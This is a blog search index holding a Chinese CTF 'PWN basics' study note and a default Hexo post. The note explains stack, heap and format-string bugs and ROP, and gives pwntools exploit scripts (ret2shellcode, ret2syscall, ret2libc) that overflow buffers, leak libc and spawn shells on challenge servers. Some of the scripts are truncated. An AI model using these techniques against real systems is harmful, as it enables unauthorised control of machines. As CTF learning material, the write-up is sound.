<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn基础（摘要）</title>
    <link href="/2025/07/25/PWN/"/>
    <url>/2025/07/25/PWN/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN基础入门大全（摘抄）"><a href="#PWN基础入门大全（摘抄）" class="headerlink" title="PWN基础入门大全（摘抄）"></a>PWN基础入门大全（摘抄）</h1><p>一、什么是PWN<br>PWN是一个黑客之间使用的词语，通常指攻破设备或系统。发音类似“砰”，对黑客而言，这象征着成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被操纵了。在网络安全语境中，PWN通常指的是通过不同的攻击手段如利用漏洞、进行社会工程学攻击等方法成功地获得了一个设备、系统或网络的未授权控制权。一旦攻击者“PWN了”一个系统，他们就可以执行各种恶意活动，如窃取数据、安装恶意软件或制造更广泛的破坏。</p><p>在CTF（Capture The Flag）等黑客竞赛中，PWN任务经常涉及在一个受限制的环境中寻找和利用漏洞来访问受保护的资源或系统。具体来说，PWN题目通常会提供一个用C或C++编写的程序，该程序运行在目标服务器上，参赛者需要通过网络与服务器进行交互，利用程序中的漏洞（如栈溢出、堆溢出、整数溢出、格式化字符串漏洞等）来造成内存破坏，进而获取远程计算机的shell，并最终获得flag。</p><p>二、常见PWN漏洞<br>栈溢出（Stack Overflow）<br>栈溢出是一种常见的安全漏洞，它利用了程序在执行过程中使用的栈内存空间有限的特性。栈是一种数据结构，用来存储函数的局部变量、函数的参数以及函数调用的返回地址等信息。栈的特点是先进后出，即最后进入栈的数据最先被访问到。当攻击者向程序输入过多的数据时，这些数据会超出栈内存所能容纳的范围，从而覆盖了栈中的其他数据，甚至覆盖了函数返回地址。一旦返回地址被篡改，程序就会跳转到攻击者指定的代码执行，从而实现任意代码执行的攻击。</p><p>堆溢出（Heap Overflow）<br>堆溢出是另一种内存溢出漏洞，但与栈溢出不同，它发生在程序的堆内存区域。堆是用来动态分配内存的区域，程序员可以请求分配任意大小的内存块，并在程序运行期间随时释放它们。堆溢出通常是由于程序在写入数据时超出了申请的内存块大小，导致数据覆盖了相邻的内存块。</p><p>整数溢出（Integer Overflow）<br>整数溢出发生在将一个较大的整数赋值给一个较小范围的整数变量时，导致数据超出该变量的存储范围并发生溢出。这种溢出可能导致数据被截断、覆盖或产生不正确的计算结果。攻击者可以利用整数溢出漏洞来绕过安全限制、绕过认证机制或执行其他恶意操作。</p><p>格式化字符串漏洞（Format String Vulnerability）<br>格式化字符串漏洞通常发生在C语言等编程语言中，当程序不正确地处理格式化字符串函数（如printf、sprintf等）的输入时。攻击者可以通过构造特制的格式化字符串来读取或写入任意内存地址的数据，甚至执行任意代码。</p><p>ROP（Return-oriented Programming）<br>ROP是一种利用程序中的现有代码片段（称为“gadgets”）来执行攻击者意图的技术。在启用了某些安全保护（如NX位、ASLR等）的环境中，传统的栈溢出攻击可能难以直接执行shellcode。ROP通过覆盖返回地址为程序中的某个gadget的地址，并利用一系列这样的gadgets来构建攻击载荷，最终实现攻击者的目标。</p><p>三、PWN环境搭建<br>安装pwntools模块</p><p>安装代码：sudo apt-get install python3-pippip3 install pwntools</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725171307217.png" alt="image-20250725171307217"></p><p>安装gdb工具和gef插件<br>安装代码：sudo apt-get install gdbsudo git clone <a href="https://github.com/hugsy/gefcp">https://github.com/hugsy/gefcp</a> gef&#x2F;gef.py ~&#x2F;.gdbinit-gef.pyecho source ~&#x2F;.gdbinit-gef.py &gt; ~&#x2F;.gdbinit</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725171352306.png" alt="image-20250725171352306"></p><p>安装qemu模拟器</p><p>安装代码：sudo apt-get install qemusudo apt-get install qemu-system qemu-user qemu-user-static binfmt-support</p><p>安装依赖和模块</p><p>安装代码：sudo apt-get install gcc-arm-linux-gnueabisudo apt install gcc-mipsel-linux-gnusudo apt install gcc-mips-linux-gnusudo apt-get install gdb-multiarchpip3 install ropgadgetpip3 install ropper</p><p>四、PWN基础讲解</p><p>1.Linux内存布局：</p><p>栈段（Stack）：用于存放非静态的局部变量、函数调用过程的栈帧信息等，地址空间向下生长，由编译器自动分配和释放，栈大小在运行时由内核动态调整，栈动态增长后就不会再收缩。</p><p>内存映射段（Memory Mapping Segment）：也称为文件映射区和匿名映射区，加载的动态库、打开的文件等均映射到该区域。</p><p>堆段（Heap）：运行时可动态分配的内存段，向上生长，由用户进行申请和释放等管理操作。</p><p>BSS段（BSS segment）：具有读写权限，用于存放初始值为0或未初始化的全局变量、静态变量，这块内存会由操作系统初始化为0。</p><p>数据段（Data segment）：具有读写权限，用于存放初始值非0的全局变量、静态变量。</p><p>代码段（Text segment）：具有只读权限，用于存放可执行程序、字符串、只读变量等。如定义的const变量、printf函数的格式化字符串等。</p><p> 经典栈溢出<br>2.1. 栈说明<br>栈是一种数据结构，遵循后进先出的原则（Last in First Out），主要有压栈（push）与出栈（pop）两种操作eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。如果用C语言来解释，可以把这些寄存器当作变量看待。在栈中，esp保存栈帧的栈顶地址，ebp保存栈帧的栈底地址。程序的栈是从进程地址空间的高地址向低地址增长的。</p><p>2.2. 栈溢出原理<br>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。<br>栈溢出的前提是：程序向栈上写入数据，数据的长度不受控制。<br>最简单的栈溢出就是通过溢出，覆盖程序的返回地址，将返回地址覆盖为system(“&#x2F;bin&#x2F;sh”)的地址。</p><p>2.3. 简单栈溢出利用<br>通过CTFHUB平台技能树中的ret2text题进行栈溢出学习。<br>首先下载附件，使用checksec工具检查程序开启的保护：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725171832837.png" alt="image-20250725171832837"></p><p>该程序未开启保护，并且是amd的64位程序，拖入ida进行静态分析：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725171842800.png" alt="image-20250725171842800"></p><p>阅读代码发现程序调用了gets函数，gets本身是一个危险函数，它不会对字符串的长度进行校验，而是以回车判断输入是否结束，存在栈溢出漏洞，shift+f12发现程序中有可执行后门system(“&#x2F;bin&#x2F;sh”)：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725171851637.png" alt="image-20250725171851637"></p><p>那么溢出ret到执行system(“&#x2F;bin&#x2F;sh”)的地址即可，双击&#x2F;bin&#x2F;sh，ctrl+x追踪到&#x2F;bin&#x2F;sh的地址为0x04007B8：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725171900324.png" alt="image-20250725171900324"></p><p>查看v4，发现设定的v4长度为0x70，同时由于是64位系统，需要+8字节覆盖掉ebp（32位系统+4字节覆盖掉ebp）：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725171912150.png" alt="image-20250725171912150"></p><p>接下来就可以编写exp，运行成功获取shell：</p><p>from pwn import * p &#x3D; remote(“challenge-5ed622b3b63a7e82.sandbox.ctfhub.com”,28525)#&#x2F;bin&#x2F;sh的地址shell_addr &#x3D; 0x04007B8</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725171946574.png" alt="image-20250725171946574"></p><p>总结栈溢出漏洞利用两个重要步骤：</p><p>寻找危险函数（ gets、scanf、vscanf、sprintf、strcpy、strcat、bcopy等）</p><p>确定填充长度，计算要操作的地址与要覆盖的地址的距离</p><ol start="3"><li>常见ROP栈溢出利用<br>3.1. ret2shellcode<br>shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。利用方式是将shellcode写入程序，然后利用栈溢出将eip的返回地址覆盖为shellcode的地址，进而让程序执行shellcode。这就需要程序中存在一个位置能够让我们写入shellcode并执行（比如bss段）。<br>以NewStarCTF平台中的ret2shellcode题为例。</li></ol><p>将附件拖入IDA，注意mmap函数，它是向文件映射去申请一块内存，是动态库，共享内存等映射物理空间的内存：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725172552965.png" alt="image-20250725172552965"></p><p>通过pwndbg可以看到，映射的区域有可执行权限：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725172615572.png" alt="image-20250725172615572"></p><p>而且mmap指定了buf的起始地址为0x233000，因此可以利用第一个read向buff中写入shellcode，再通过第二个read进行栈溢出，将返回地址覆盖为0x233000，最后编写exp运行获取shell。</p><p>from pwn import *context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)#用pwntools生成shellcodeshellcode &#x3D; asm(shellcraft.sh())p &#x3D; remote(‘219.219.61.234’,49544)p.recvline()#把shellcode写入bufp.sendline(shellcode)p.recvline()</p><p>ret2syscall<br>ret2syscall，即控制程序执行系统调用获取shell。<br>系统调用是指由操作系统提供的供所有系统调用的程序接口集合，用户程序通常只在用户态下运行，当用户程序想要调用只能在内核态运行的子程序时，操作系统需要提供访问这些内核态运行的程序的接口，这些接口的集合就叫做系统调用，简要的说，系统调用是内核向用户进程提供服务的唯一方法。</p><p>用户程序通过系统调用从用户态（user mode）切换到核心态（kernel mode ），从而可以访问相应的资源。要使用系统调用，需要通过汇编指令int 0x80实现，用系统调用号来区分入口函数。<br>以CTFWIKI平台中的ret2syscall题为例。<br>首先检测程序开启的保护：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725172751094.png" alt="image-20250725172751094"></p><p>看到为32位，还开启了NX保护，拖入IDA查看源代码：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725172809524.png" alt="image-20250725172809524"></p><p>可以看到依然是gets函数的栈溢出，但是由于程序本身没有后门，并且无法自己写入shellcode来获得shell，这是就要用到系统调用。</p><p>简单地说，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们再执行int 0x80就可执行对应的系统调用。这里可以用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个系统调用来获取shell，其中execve对应的系统调用号为0xb。</p><p>由于程序是32位的，按照execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)，令eax为execve的系统调用号0xb，第一个参数ebx指向&#x2F;bin&#x2F;sh，ecx和edx为0。</p><p>而我们如何控制这些寄存器的值呢？这里就需要使用gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在eax的值就为10。但是我们并不能期待有一段连续的代码可以理想控制对应的寄存器，所以我们需要一段一段控制，这里需要用到ROPgadget工具寻找gadget。</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725172842824.png" alt="image-20250725172842824"></p><p>先找到控制eax的gadget，这几个都可以控制eax，这里使用第二个。再找控制ebx的gadget：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725172914882.png" alt="image-20250725172914882"></p><p>以上都可以使用，由于0x0806eb68可以控制三个寄存器，所以选用这个地址。然后找到&#x2F;bin&#x2F;sh的地址：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725173020465.png" alt="image-20250725173020465"></p><p>以及int 0x80的地址：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725173037341.png" alt="image-20250725173037341"></p><p>最后编写exp脚本，运行获取shell。</p><p>结果：from pwn import *p &#x3D; process(‘.&#x2F;rop’)pop_eax_ret &#x3D; 0x080bb196pop_ebx_ecx_edx_ret &#x3D; 0x0806eb90sh &#x3D; 0x080be408int_0x80 &#x3D; 0x08049421payload &#x3D; b’a’ * 112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_ebx_ecx_edx_ret) + p32(0) + p32(0) + p32(sh) + p32(int_0x80)p.sendline(payload)p.interactive()</p><p>ret2libc<br>ret2libc即控制函数执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容)。一般情况下，我们会选择执行system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道system函数的地址。</p><p>以NewStarCTF平台的ret2libc题进行学习。</p><p>首先下载附件，得到一个程序以及程序用到的libc，将程序拖入IDA分析：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725173205331.png" alt="image-20250725173205331"></p><p>很明显fgets处存在栈溢出，但通过寻找，没有发现可利用的函数：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725173223475.png" alt="image-20250725173223475"></p><p>根据动态链接和延迟绑定技术，运用任意地址读写技术对某个函数的GOT表进行改写，使其指向想要执行的危险函数（如system，execve函数）</p><p>操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，也就是控制执行libc（对应版本）中的函数，通常是返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，我们会选择执行system(“&#x2F;bin&#x2F;sh”)或者execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)，故而此时我们需要知道system函数的地址。</p><p>所以首先要做的是通过栈溢出，泄露出puts真实的地址，然后计算真实地址与libc中puts地址的偏移，进而计算出system与&#x2F;bin&#x2F;sh的地址，同时还要获取rdi、ret与main函数的地址。</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725173248137.png" alt="image-20250725173248137"></p><p>可以使用pwndbg工具寻找main函数的起始地址：</p><p><img src="C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20250725173305271.png" alt="image-20250725173305271"></p><p>最后构造exp脚本，运行获取shell。</p><p>from pwn import *<br>elf &#x3D; ELF(‘.&#x2F;pwn’)libc &#x3D; ELF(‘.&#x2F;libc-2.31.so’)#p &#x3D; process(‘.&#x2F;pwn’)p &#x3D; remote(‘node4.buuoj.cn’,25948)<br>#puts的plt表与got表地址puts_plt &#x3D; elf.plt[‘puts’] puts_got &#x3D; elf.got[‘puts’]<br>#libc中puts、system、&#x2F;bin&#x2F;sh的地址libc_puts &#x3D; libc.symbols[‘puts’]libc_system &#x3D; libc.symbols[‘system’]libc_sh &#x3D; libc.search(b’&#x2F;bin&#x2F;sh’).<strong>next</strong>()<br>pop_ret_rdi &#x3D; 0x400753main &#x3D; 0x400698ret &#x3D; 0x40050e<br>p.recvuntil(b’time?\n’)#64位的payload构成：栈溢出+pop rdi地址+泄露函数的got表地址+泄露函数的plt地址+ret指令（这里ret回main函数是为了跳回程序开头重新执行程序）payload &#x3D; b’a’ * (0x20+8) + p64(pop_ret_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)p.sendline(payload)<br>#直到7f出现的位置作为终点，开始往前读6个字节数据，然后再8字节对齐，不足8位补\x00#\x7f是64位程序函数地址的默认开头，-6就是从倒数第6个字节开始取,在内存中是倒着放的#32位u32(r.recv()[0:4])puts_addr &#x3D; u64(p.recvuntil(‘\x7f’)[-6:].ljust(8,b’\x00’)) #puts函数的真实地址#偏移base &#x3D; puts_addr - libc_puts#真实的system和&#x2F;bin&#x2F;sh地址system_addr &#x3D; base + libc_systemsh_addr &#x3D; base + libc_sh<br>payload &#x3D; b’a’ * (0x20+8) + p64(ret) + p64(pop_ret_rdi) + p64(sh_addr) + p64(system_addr)p.sendline(payload)p.interactive()</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/07/25/hello-world/"/>
    <url>/2025/07/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
